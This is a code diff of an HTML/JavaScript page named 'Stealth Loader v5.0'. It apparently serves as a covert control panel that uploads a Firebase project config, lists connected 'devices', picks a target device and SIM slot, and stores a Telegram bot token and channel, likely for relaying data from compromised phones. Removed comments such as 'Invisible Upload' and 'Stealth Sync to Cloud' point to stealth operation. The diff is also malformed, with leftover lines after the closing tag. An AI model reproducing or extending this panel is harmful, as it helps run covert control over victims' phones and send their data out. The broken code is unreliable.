@@ -2,84 +2,101 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>@REALSUNIO | Stealth Edition</title>
+    <title>@REALSUNIO | Stealth Loader v5.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&display=swap" rel="stylesheet">
     <style>
         body { background: #050005; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
-        .pink-glow { text-shadow: 0 0 10px #ff007f; }
+        .pink-glow { text-shadow: 0 0 15px #ff007f; }
         .pink-border { border: 1px solid #ff007f; }
         .orbitron { font-family: 'Orbitron', sans-serif; }
+        
+        /* Loading Screen Styles */
+        #loader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 9999; display: none;
+            flex-direction: column; align-items: center; justify-content: center;
+        }
+        .bar-container { width: 200px; height: 2px; background: #1a000a; margin-top: 20px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: #ff007f; box-shadow: 0 0 10px #ff007f; transition: width 0.3s; }
     </style>
 </head>
 <body class="text-zinc-200">
+
+    <div id="loader">
+        <h1 class="orbitron pink-glow text-2xl text-[#ff007f] animate-pulse">@REALSUNIO</h1>
+        <p class="text-[9px] tracking-[0.4em] text-pink-500 mt-2">INITIALIZING CORE...</p>
+        <div class="bar-container">
+            <div id="progressBar" class="progress-bar"></div>
+        </div>
+    </div>
+
     <audio id="syncBeep" src="https://www.soundjay.com/buttons/sounds/button-3.mp3"></audio>
 
-    <header class="p-4 border-b border-pink-900/40 bg-black flex justify-between items-center">
-        <div class="flex items-center gap-3">
+    <div id="mainContent">
+        <header class="p-4 border-b border-pink-900/40 bg-black flex justify-between items-center">
             <h1 class="text-xl font-black orbitron pink-glow text-[#ff007f]">@REALSUNIO</h1>
-        </div>
-        <div id="status" class="text-[10px] font-bold text-pink-900 uppercase tracking-widest">System Standby</div>
-    </header>
+            <div id="status" class="text-[10px] font-bold text-pink-900 uppercase">Standby</div>
+        </header>
 
-    <main class="max-w-6xl mx-auto p-6 grid grid-cols-1 lg:grid-cols-12 gap-6">
-        
-        <div class="lg:col-span-4 space-y-4">
-            <div class="bg-zinc-900/30 p-5 rounded-2xl pink-border">
-                <input type="file" id="jsonFile" accept=".json" class="hidden">
-                <button onclick="document.getElementById('jsonFile').click()" class="w-full bg-pink-600/5 hover:bg-pink-600/10 py-3 rounded-xl text-pink-500 text-[10px] font-bold border border-pink-900/50 transition mb-4">
-                    INITIALIZE CORE
-                </button>
-                
-                <div class="space-y-3">
-                    <input type="password" id="tgToken" placeholder="Bot Token" class="w-full bg-black p-3 rounded-xl text-xs outline-none border border-pink-900/30 focus:border-pink-500">
-                    <input type="text" id="channelId" placeholder="Channel ID (-100...)" class="w-full bg-black p-3 rounded-xl text-xs outline-none border border-pink-900/30 focus:border-pink-500">
-                    <button onclick="saveConfig()" class="w-full bg-[#ff007f] py-3 rounded-xl text-white font-bold text-xs transition active:scale-95">SYNC ENGINE</button>
+        <main class="max-w-6xl mx-auto p-6 grid grid-cols-1 lg:grid-cols-12 gap-6">
+            <div class="lg:col-span-4 space-y-4">
+                <div class="bg-zinc-900/30 p-5 rounded-2xl pink-border">
+                    <input type="file" id="jsonFile" accept=".json" class="hidden">
+                    <button onclick="document.getElementById('jsonFile').click()" class="w-full bg-pink-600/10 py-3 rounded-xl text-pink-500 text-[10px] font-bold border border-pink-900/50 mb-4">
+                        SELECT JSON
+                    </button>
+                    <div class="space-y-3">
+                        <input type="password" id="tgToken" placeholder="Bot Token" class="w-full bg-black p-3 rounded-xl text-xs outline-none border border-pink-900/30 focus:border-pink-500">
+                        <input type="text" id="channelId" placeholder="Channel ID (-100...)" class="w-full bg-black p-3 rounded-xl text-xs outline-none border border-pink-900/30 focus:border-pink-500">
+                        <button onclick="saveConfig()" class="w-full bg-[#ff007f] py-3 rounded-xl text-white font-bold text-xs">SYNC ENGINE</button>
+                    </div>
                 </div>
             </div>
-        </div>
 
-        <div class="lg:col-span-4 bg-zinc-900/30 p-6 rounded-2xl pink-border min-h-[400px]">
-            <h2 class="text-[10px] font-bold mb-6 text-pink-400 orbitron">NODE MANAGER</h2>
-            <div id="noDevices" class="text-center py-20 opacity-20 text-xs uppercase italic">No active nodes...</div>
-            <div id="deviceList" class="space-y-2"></div>
-
-            <div id="simControl" class="hidden mt-6 pt-6 border-t border-pink-900/20">
-                <div class="flex gap-2">
-                    <button id="s1" onclick="selectSim(1)" class="flex-1 py-4 bg-black rounded-xl border border-pink-900 text-[10px] font-bold">SIM 01</button>
-                    <button id="s2" onclick="selectSim(2)" class="flex-1 py-4 bg-black rounded-xl border border-pink-900 text-[10px] font-bold">SIM 02</button>
+            <div class="lg:col-span-4 bg-zinc-900/30 p-6 rounded-2xl pink-border min-h-[400px]">
+                <h2 class="text-[10px] font-bold mb-6 text-pink-400 orbitron">NODES</h2>
+                <div id="noDevices" class="text-center py-20 opacity-20 text-xs">Awaiting Nodes...</div>
+                <div id="deviceList" class="space-y-2"></div>
+                <div id="simControl" class="hidden mt-6 pt-6 border-t border-pink-900/20">
+                    <div class="flex gap-2">
+                        <button id="s1" onclick="selectSim(1)" class="flex-1 py-4 bg-black rounded-xl border border-pink-900 text-[10px] font-bold">SIM 01</button>
+                        <button id="s2" onclick="selectSim(2)" class="flex-1 py-4 bg-black rounded-xl border border-pink-900 text-[10px] font-bold">SIM 02</button>
+                    </div>
                 </div>
             </div>
-        </div>
 
-        <div class="lg:col-span-4 bg-black p-5 rounded-2xl pink-border h-[400px] flex flex-col">
-            <div id="logs" class="flex-1 overflow-y-auto font-mono text-[9px] space-y-1 text-pink-300/50">
-                <p>> Protocol 4.0 Ready...</p>
+            <div class="lg:col-span-4 bg-black p-5 rounded-2xl pink-border h-[400px] flex flex-col">
+                <div id="logs" class="flex-1 overflow-y-auto font-mono text-[9px] space-y-1 text-pink-300/50"></div>
             </div>
-        </div>
-
-    </main>
+        </main>
+    </div>
 
     <script>
         let db;
-        const beep = document.getElementById('syncBeep');
+        const loader = document.getElementById('loader');
+        const pBar = document.getElementById('progressBar');
 
-        const addLog = (m) => {
-            const l = document.getElementById('logs');
-            l.innerHTML = `<div><span class="text-pink-600">>></span> ${m}</div>` + l.innerHTML;
-        };
-
-        // Invisible Upload & Processing
         document.getElementById('jsonFile').onchange = (e) => {
+            const file = e.target.files[0];
+            if(!file) return;
+
+            // Show Loading Screen
+            loader.style.display = 'flex';
+            let width = 0;
+            const interval = setInterval(() => {
+                if (width >= 90) clearInterval(interval);
+                else { width += 5; pBar.style.width = width + '%'; }
+            }, 100);
+
             const reader = new FileReader();
             reader.onload = (ev) => {
                 try {
                     const config = JSON.parse(ev.target.result);
                     const pid = config.project_info.project_id;
                     
-                    // Invisible Init
                     if (!firebase.apps.length) {
                         firebase.initializeApp({
                             databaseURL: `https://${pid}-default-rtdb.firebaseio.com`,
@@ -88,21 +105,55 @@
                     }
                     db = firebase.database();
                     
-                    // Stealth Sync to Cloud
                     db.ref('realsunio_sync/full_config').set(config).then(() => {
-                        beep.play().catch(()=>{}); // Only a Beep, no popup
-                        document.getElementById('status').innerText = "CORE: ACTIVE";
-                        document.getElementById('status').classList.add('text-pink-600');
-                        listenForDevices();
+                        pBar.style.width = '100%';
+                        setTimeout(() => {
+                            loader.style.display = 'none';
+                            document.getElementById('syncBeep').play();
+                            document.getElementById('status').innerText = "CORE: ACTIVE";
+                            listenForDevices();
+                        }, 500);
                     });
-                } catch(err) { console.log("Silent Error"); }
+                } catch(err) { loader.style.display = 'none'; alert("Invalid JSON"); }
             };
-            reader.readAsText(e.target.files[0]);
+            reader.readAsText(file);
         };
 
         function listenForDevices() {
             db.ref('devices').on('value', snap => {
                 const list = document.getElementById('deviceList');
+                const empty = document.getElementById('noDevices');
+                list.innerHTML = '';
+                if(snap.exists()) {
+                    empty.classList.add('hidden');
+                    snap.forEach(d => {
+                        const div = document.createElement('div');
+                        div.className = "p-3 bg-zinc-950 rounded-lg border border-pink-900/40 cursor-pointer text-[11px] hover:border-pink-500 transition";
+                        div.innerHTML = `Device: ${d.key}`;
+                        div.onclick = () => {
+                            db.ref('app_config/active_device').set(d.key);
+                            document.getElementById('simControl').classList.remove('hidden');
+                        };
+                        list.appendChild(div);
+                    });
+                }
+            });
+        }
+
+        function selectSim(s) {
+            db.ref('app_config/active_sim_slot').set(s);
+            document.getElementById('s1').style.borderColor = s==1 ? '#ff007f' : '#1a000a';
+            document.getElementById('s2').style.borderColor = s==2 ? '#ff007f' : '#1a000a';
+        }
+
+        function saveConfig() {
+            const t = document.getElementById('tgToken').value;
+            const c = document.getElementById('channelId').value;
+            if(db) db.ref('app_config').update({ tgToken: t, channelId: c });
+        }
+    </script>
+</body>
+</html>
                 const empty = document.getElementById('noDevices');
                 list.innerHTML = '';
                 if(snap.exists()) {
